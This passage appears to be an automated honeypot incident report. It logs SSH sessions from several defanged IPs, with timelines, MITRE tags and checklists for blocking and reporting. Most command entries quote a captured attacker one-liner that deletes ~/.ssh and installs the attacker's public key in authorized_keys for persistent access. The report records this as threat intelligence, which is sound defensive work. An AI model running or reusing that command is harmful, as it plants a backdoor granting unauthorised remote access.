| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:45:20` | `cowrie.session.connect` |
| `2026-04-14 08:45:20` | `cowrie.client.version` |
| `2026-04-14 08:45:20` | `cowrie.client.kex` |
| `2026-04-14 08:45:21` | `cowrie.login.success` |
| `2026-04-14 08:45:22` | `cowrie.session.params` |
| `2026-04-14 08:45:22` | `cowrie.command.input` |
| `2026-04-14 08:45:22` | `cowrie.command.failed` |
| `2026-04-14 08:45:22` | `cowrie.log.closed` |
| `2026-04-14 08:45:22` | `cowrie.session.params` |
| `2026-04-14 08:45:22` | `cowrie.command.input` |
| `2026-04-14 08:45:23` | `cowrie.session.file_download` |
| `2026-04-14 08:45:23` | `cowrie.log.closed` |
| `2026-04-14 08:45:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.175.34[.]74` to AbuseIPDB if not already reported
- [ ] Block `107.175.34[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00c1d31d0512

| Field | Detail |
|---|---|
| **Source IP** | `107.175.34[.]74` |
| **First Seen** | 2026-04-14 08:45 |
| **Last Seen** | 2026-04-14 08:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:45:25` | `cowrie.session.connect` |
| `2026-04-14 08:45:25` | `cowrie.client.version` |
| `2026-04-14 08:45:26` | `cowrie.client.kex` |
| `2026-04-14 08:45:26` | `cowrie.login.success` |
| `2026-04-14 08:45:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.175.34[.]74` to AbuseIPDB if not already reported
- [ ] Block `107.175.34[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bcc8c76481d

| Field | Detail |
|---|---|
| **Source IP** | `101.132.155[.]153` |
| **First Seen** | 2026-04-14 08:45 |
| **Last Seen** | 2026-04-14 08:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:45:57` | `cowrie.session.connect` |
| `2026-04-14 08:45:57` | `cowrie.client.version` |
| `2026-04-14 08:45:58` | `cowrie.client.kex` |
| `2026-04-14 08:45:58` | `cowrie.login.success` |
| `2026-04-14 08:45:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.132.155[.]153` to AbuseIPDB if not already reported
- [ ] Block `101.132.155[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad172fed3af3

| Field | Detail |
|---|---|
| **Source IP** | `112.217.188[.]122` |
| **First Seen** | 2026-04-14 08:48 |
| **Last Seen** | 2026-04-14 08:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:48:17` | `cowrie.session.connect` |
| `2026-04-14 08:48:17` | `cowrie.client.version` |
| `2026-04-14 08:48:17` | `cowrie.client.kex` |
| `2026-04-14 08:48:17` | `cowrie.login.success` |
| `2026-04-14 08:48:18` | `cowrie.session.params` |
| `2026-04-14 08:48:18` | `cowrie.command.input` |
| `2026-04-14 08:48:18` | `cowrie.command.failed` |
| `2026-04-14 08:48:18` | `cowrie.log.closed` |
| `2026-04-14 08:48:18` | `cowrie.session.params` |
| `2026-04-14 08:48:18` | `cowrie.command.input` |
| `2026-04-14 08:48:18` | `cowrie.session.file_download` |
| `2026-04-14 08:48:18` | `cowrie.log.closed` |
| `2026-04-14 08:48:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.188[.]122` to AbuseIPDB if not already reported
- [ ] Block `112.217.188[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d672f6fdc45

| Field | Detail |
|---|---|
| **Source IP** | `112.217.188[.]122` |
| **First Seen** | 2026-04-14 08:48 |
| **Last Seen** | 2026-04-14 08:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:48:20` | `cowrie.session.connect` |
| `2026-04-14 08:48:20` | `cowrie.client.version` |
| `2026-04-14 08:48:20` | `cowrie.client.kex` |
| `2026-04-14 08:48:21` | `cowrie.login.success` |
| `2026-04-14 08:48:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.188[.]122` to AbuseIPDB if not already reported
- [ ] Block `112.217.188[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0a00607a4d7

| Field | Detail |
|---|---|
| **Source IP** | `107.175.34[.]74` |
| **First Seen** | 2026-04-14 08:50 |
| **Last Seen** | 2026-04-14 08:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:50:57` | `cowrie.session.connect` |
| `2026-04-14 08:50:57` | `cowrie.client.version` |
| `2026-04-14 08:50:57` | `cowrie.client.kex` |
| `2026-04-14 08:50:58` | `cowrie.login.success` |
| `2026-04-14 08:50:58` | `cowrie.session.params` |
| `2026-04-14 08:50:58` | `cowrie.command.input` |
| `2026-04-14 08:50:58` | `cowrie.command.failed` |
| `2026-04-14 08:50:58` | `cowrie.log.closed` |
| `2026-04-14 08:50:59` | `cowrie.session.params` |
| `2026-04-14 08:50:59` | `cowrie.command.input` |
| `2026-04-14 08:50:59` | `cowrie.session.file_download` |
| `2026-04-14 08:50:59` | `cowrie.log.closed` |
| `2026-04-14 08:51:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.175.34[.]74` to AbuseIPDB if not already reported
- [ ] Block `107.175.34[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e908df81469b

| Field | Detail |
|---|---|
| **Source IP** | `107.175.34[.]74` |
| **First Seen** | 2026-04-14 08:51 |
| **Last Seen** | 2026-04-14 08:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:51:02` | `cowrie.session.connect` |
| `2026-04-14 08:51:02` | `cowrie.client.version` |
| `2026-04-14 08:51:02` | `cowrie.client.kex` |
| `2026-04-14 08:51:03` | `cowrie.login.success` |
| `2026-04-14 08:51:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.175.34[.]74` to AbuseIPDB if not already reported
- [ ] Block `107.175.34[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3b0c811348f

| Field | Detail |
|---|---|
| **Source IP** | `220.118.173[.]234` |
| **First Seen** | 2026-04-14 08:51 |
| **Last Seen** | 2026-04-14 08:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:51:19` | `cowrie.session.connect` |
| `2026-04-14 08:51:19` | `cowrie.client.version` |
| `2026-04-14 08:51:20` | `cowrie.client.kex` |
| `2026-04-14 08:51:20` | `cowrie.login.success` |
| `2026-04-14 08:51:20` | `cowrie.session.params` |
| `2026-04-14 08:51:20` | `cowrie.command.input` |
| `2026-04-14 08:51:20` | `cowrie.command.failed` |
| `2026-04-14 08:51:20` | `cowrie.log.closed` |
| `2026-04-14 08:51:21` | `cowrie.session.params` |
| `2026-04-14 08:51:21` | `cowrie.command.input` |
| `2026-04-14 08:51:21` | `cowrie.session.file_download` |
| `2026-04-14 08:51:21` | `cowrie.log.closed` |
| `2026-04-14 08:51:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.118.173[.]234` to AbuseIPDB if not already reported
- [ ] Block `220.118.173[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e493cce464f

| Field | Detail |
|---|---|
| **Source IP** | `220.118.173[.]234` |
| **First Seen** | 2026-04-14 08:51 |
| **Last Seen** | 2026-04-14 08:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:51:23` | `cowrie.session.connect` |
| `2026-04-14 08:51:23` | `cowrie.client.version` |
| `2026-04-14 08:51:23` | `cowrie.client.kex` |
| `2026-04-14 08:51:24` | `cowrie.login.success` |
| `2026-04-14 08:51:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.118.173[.]234` to AbuseIPDB if not already reported
- [ ] Block `220.118.173[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bfcc5e22fbd

| Field | Detail |
|---|---|
| **Source IP** | `112.217.188[.]122` |
| **First Seen** | 2026-04-14 08:53 |
| **Last Seen** | 2026-04-14 08:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:53:21` | `cowrie.session.connect` |
| `2026-04-14 08:53:21` | `cowrie.client.version` |
| `2026-04-14 08:53:21` | `cowrie.client.kex` |
| `2026-04-14 08:53:22` | `cowrie.login.success` |
| `2026-04-14 08:53:22` | `cowrie.session.params` |
| `2026-04-14 08:53:22` | `cowrie.command.input` |
| `2026-04-14 08:53:22` | `cowrie.command.failed` |
| `2026-04-14 08:53:22` | `cowrie.log.closed` |
| `2026-04-14 08:53:23` | `cowrie.session.params` |
| `2026-04-14 08:53:23` | `cowrie.command.input` |
| `2026-04-14 08:53:23` | `cowrie.session.file_download` |
| `2026-04-14 08:53:23` | `cowrie.log.closed` |
| `2026-04-14 08:53:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.188[.]122` to AbuseIPDB if not already reported
- [ ] Block `112.217.188[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a53a492119a3

| Field | Detail |
|---|---|
| **Source IP** | `112.217.188[.]122` |
| **First Seen** | 2026-04-14 08:53 |
| **Last Seen** | 2026-04-14 08:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:53:25` | `cowrie.session.connect` |
| `2026-04-14 08:53:25` | `cowrie.client.version` |
| `2026-04-14 08:53:25` | `cowrie.client.kex` |
| `2026-04-14 08:53:26` | `cowrie.login.success` |
| `2026-04-14 08:53:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.188[.]122` to AbuseIPDB if not already reported
- [ ] Block `112.217.188[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ee9f404adae

| Field | Detail |
|---|---|
| **Source IP** | `107.175.34[.]74` |
| **First Seen** | 2026-04-14 08:55 |
| **Last Seen** | 2026-04-14 08:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:55:22` | `cowrie.session.connect` |
| `2026-04-14 08:55:22` | `cowrie.client.version` |
| `2026-04-14 08:55:22` | `cowrie.client.kex` |
| `2026-04-14 08:55:23` | `cowrie.login.success` |
| `2026-04-14 08:55:24` | `cowrie.session.params` |
| `2026-04-14 08:55:24` | `cowrie.command.input` |
| `2026-04-14 08:55:24` | `cowrie.command.failed` |
| `2026-04-14 08:55:24` | `cowrie.log.closed` |
| `2026-04-14 08:55:24` | `cowrie.session.params` |
| `2026-04-14 08:55:24` | `cowrie.command.input` |
| `2026-04-14 08:55:25` | `cowrie.session.file_download` |
| `2026-04-14 08:55:25` | `cowrie.log.closed` |
| `2026-04-14 08:55:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.175.34[.]74` to AbuseIPDB if not already reported
- [ ] Block `107.175.34[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b46a9233dcbd

| Field | Detail |
|---|---|
| **Source IP** | `107.175.34[.]74` |
| **First Seen** | 2026-04-14 08:55 |
| **Last Seen** | 2026-04-14 08:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:55:27` | `cowrie.session.connect` |
| `2026-04-14 08:55:27` | `cowrie.client.version` |
| `2026-04-14 08:55:28` | `cowrie.client.kex` |
| `2026-04-14 08:55:28` | `cowrie.login.success` |
| `2026-04-14 08:55:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.175.34[.]74` to AbuseIPDB if not already reported
- [ ] Block `107.175.34[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a5897a1ac0a

| Field | Detail |
|---|---|
| **Source IP** | `220.118.173[.]234` |
| **First Seen** | 2026-04-14 08:56 |
| **Last Seen** | 2026-04-14 08:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:56:26` | `cowrie.session.connect` |
| `2026-04-14 08:56:26` | `cowrie.client.version` |
| `2026-04-14 08:56:26` | `cowrie.client.kex` |
| `2026-04-14 08:56:27` | `cowrie.login.success` |
| `2026-04-14 08:56:27` | `cowrie.session.params` |
| `2026-04-14 08:56:27` | `cowrie.command.input` |
| `2026-04-14 08:56:27` | `cowrie.command.failed` |
| `2026-04-14 08:56:27` | `cowrie.log.closed` |
| `2026-04-14 08:56:28` | `cowrie.session.params` |
| `2026-04-14 08:56:28` | `cowrie.command.input` |
| `2026-04-14 08:56:28` | `cowrie.session.file_download` |
| `2026-04-14 08:56:28` | `cowrie.log.closed` |
| `2026-04-14 08:56:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.118.173[.]234` to AbuseIPDB if not already reported
- [ ] Block `220.118.173[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96719324a3f3

| Field | Detail |
|---|---|
| **Source IP** | `220.118.173[.]234` |
| **First Seen** | 2026-04-14 08:56 |
| **Last Seen** | 2026-04-14 08:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:56:30` | `cowrie.session.connect` |
| `2026-04-14 08:56:30` | `cowrie.client.version` |
| `2026-04-14 08:56:30` | `cowrie.client.kex` |
| `2026-04-14 08:56:31` | `cowrie.login.success` |
| `2026-04-14 08:56:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.118.173[.]234` to AbuseIPDB if not already reported
- [ ] Block `220.118.173[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a744827a9b4a

| Field | Detail |
|---|---|
| **Source IP** | `107.175.34[.]74` |
| **First Seen** | 2026-04-14 08:56 |
| **Last Seen** | 2026-04-14 08:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:56:52` | `cowrie.session.connect` |
| `2026-04-14 08:56:52` | `cowrie.client.version` |
| `2026-04-14 08:56:53` | `cowrie.client.kex` |
| `2026-04-14 08:56:53` | `cowrie.login.success` |
| `2026-04-14 08:56:54` | `cowrie.session.params` |
| `2026-04-14 08:56:54` | `cowrie.command.input` |
| `2026-04-14 08:56:54` | `cowrie.command.failed` |
| `2026-04-14 08:56:54` | `cowrie.log.closed` |
| `2026-04-14 08:56:55` | `cowrie.session.params` |
| `2026-04-14 08:56:55` | `cowrie.command.input` |
| `2026-04-14 08:56:55` | `cowrie.session.file_download` |
| `2026-04-14 08:56:55` | `cowrie.log.closed` |
| `2026-04-14 08:56:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.175.34[.]74` to AbuseIPDB if not already reported
- [ ] Block `107.175.34[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b84dbda63a1

| Field | Detail |
|---|---|
| **Source IP** | `107.175.34[.]74` |
| **First Seen** | 2026-04-14 08:56 |
| **Last Seen** | 2026-04-14 08:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:56:58` | `cowrie.session.connect` |
| `2026-04-14 08:56:58` | `cowrie.client.version` |
| `2026-04-14 08:56:58` | `cowrie.client.kex` |
| `2026-04-14 08:56:59` | `cowrie.login.success` |
| `2026-04-14 08:56:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.175.34[.]74` to AbuseIPDB if not already reported
- [ ] Block `107.175.34[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04135c0412e8

| Field | Detail |
|---|---|
| **Source IP** | `220.118.173[.]234` |
| **First Seen** | 2026-04-14 08:58 |
| **Last Seen** | 2026-04-14 08:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
